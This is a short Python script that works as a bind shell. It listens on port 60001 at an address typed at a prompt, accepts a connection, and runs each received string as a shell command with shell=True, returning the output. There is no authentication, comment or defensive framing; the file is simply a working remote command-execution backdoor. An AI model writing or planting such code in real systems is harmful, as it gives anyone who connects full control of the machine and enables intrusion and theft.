import subprocess
import socket

print(socket.gethostbyname(socket.gethostname()))
s = socket.socket()
port = 60001
host = input("IP:")

s.bind((host, port))
s.listen()
C_Sock, addr = s.accept()
while True:
    try:
        data = C_Sock.recv(4096)
        print(data)
        rpcs = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE)
        out = rpcs.stdout.read()
        print(out)
        C_Sock.send(b"[+] " + out)
    except:
        print("Error")
        raise
